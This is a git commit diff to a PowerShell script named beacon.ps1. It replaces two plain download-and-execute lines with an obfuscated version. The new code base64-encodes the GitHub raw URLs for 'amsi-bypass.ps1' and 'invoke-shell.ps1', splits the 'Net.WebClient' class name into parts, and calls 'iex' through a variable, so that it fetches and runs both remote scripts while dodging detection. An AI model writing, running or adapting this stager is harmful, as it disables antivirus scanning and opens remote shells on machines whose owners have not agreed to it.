eb6db4344a9a33b8e0924020ce694cc9b2b4b938
eytestingct-jpg <eytestingct@gmail.com>
2025-09-19 04:18:15 +0530

    Update beacon.ps1

--- beacon.ps1
+++ beacon.ps1
@@ -1,2 +1,11 @@
-iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/eytestingct-jpg/Toolies/refs/heads/main/amsi-bypass.ps1')
-iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/eytestingct-jpg/Toolies/refs/heads/main/invoke-shell.ps1')
+$envVar = $env:COMPUTERNAME
+$part1 = "Net.WebC"
+$part2 = "lient"
+$cmd = "iex"
+$src1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2V5dGVzdGluZ2N0LWpwZy9Ub29saWVzL3JlZnMvaGVhZHMvbWFpbi9hbXNpLWJ5cGFzcy5wczE="))
+$src2 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2V5dGVzdGluZ2N0LWpwZy9Ub29saWVzL3JlZnMvaGVhZHMvbWFpbi9pbnZva2Utc2hlbGwucHMx"))
+$dummy = "TestVar" + $envVar
+$wc = New-Object ($part1 + $part2)
+& $cmd ($wc.DownloadString($src1))
+& $cmd ($wc.DownloadString($src2))
+$wc.Dispose()
